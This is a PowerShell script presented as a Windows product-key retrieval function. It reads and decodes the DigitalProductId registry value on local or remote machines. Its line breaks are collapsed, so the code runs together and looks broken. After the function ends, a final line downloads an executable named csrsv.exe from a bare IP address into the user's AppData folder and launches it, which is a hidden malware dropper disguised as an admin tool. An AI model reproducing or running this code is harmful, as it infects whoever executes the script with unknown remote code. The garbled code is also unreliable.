function Get-WindowsProductKey{[CmdletBinding()]param([Parameter(Position=0,HelpMessage='ComputerName or IPv4-Address of the remote computer')][String[]]$ComputerName = $env:COMPUTERNAME,[Parameter(Position=1,HelpMessage='Credentials to authenticate agains a remote computer')][System.Management.Automation.PSCredential][System.Management.Automation.CredentialAttribute()]$Credential)Begin{$LocalAddress = @("127.0.0.1","localhost",".","$($env:COMPUTERNAME)")[System.Management.Automation.ScriptBlock]$Scriptblock = {$ProductKeyValue = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]$Wmi_Win32OperatingSystem = Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property Caption, CSDVersion, Version, OSArchitecture, BuildNumber, SerialNumber[pscustomobject] @{ProductKeyValue = $ProductKeyValueWmi_Win32OperatingSystem = $Wmi_Win32OperatingSystem				}}}Process{   foreach($ComputerName2 in $ComputerName) {              $Chars="BCDFGHJKMPQRTVWXY2346789" if($LocalAddress -contains $ComputerName2){$ComputerName2 = $env:COMPUTERNAME$Scriptblock_Result = Invoke-Command -ScriptBlock $Scriptblock}else{if(-not(Test-Connection -ComputerName $ComputerName2 -Count 2 -Quiet)){Write-Error -Message "$ComputerName2 is not reachable via ICMP!" -Category ConnectionErrorcontinue}try {if($PSBoundParameters['Credential'] -is [System.Management.Automation.PSCredential]){$Scriptblock_Result = Invoke-Command -ScriptBlock $Scriptblock -ComputerName $ComputerName2 -Credential $Credential -ErrorAction Stop}else{					    $Scriptblock_Result = Invoke-Command -ScriptBlock $Scriptblock -ComputerName $ComputerName2 -ErrorAction Stop}}catch {Write-Error -Message "$($_.Exception.Message)" -Category ConnectionErrorcontinue	}}$ProductKey = ""for($i = 24; $i -ge 0; $i--) { $r = 0 for($j = 14; $j -ge 0; $j--) { $r = ($r * 256) -bxor $Scriptblock_Result.ProductKeyValue[$j] $Scriptblock_Result.ProductKeyValue[$j] = [math]::Floor([double]($r/24)) $r = $r % 24 }$ProductKey = $Chars[$r] + $ProductKey if (($i % 5) -eq 0 -and $i -ne 0) { $ProductKey = "-" + $ProductKey } } [pscustomobject] @{ComputerName = $ComputerName2Caption = $Scriptblock_Result.Wmi_Win32OperatingSystem.CaptionCSDVersion = $Scriptblock_Result.Wmi_Win32OperatingSystem.CSDVersionWindowsVersion = $Scriptblock_Result.Wmi_Win32OperatingSystem.VersionOSArchitecture = $Scriptblock_Result.Wmi_Win32OperatingSystem.OSArchitectureBuildNumber = $Scriptblock_Result.Wmi_Win32OperatingSystem.BuildNumberSerialNumber = $Scriptblock_Result.Wmi_Win32OperatingSystem.SerialNumberProductKey = $ProductKey}     }   }End{}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")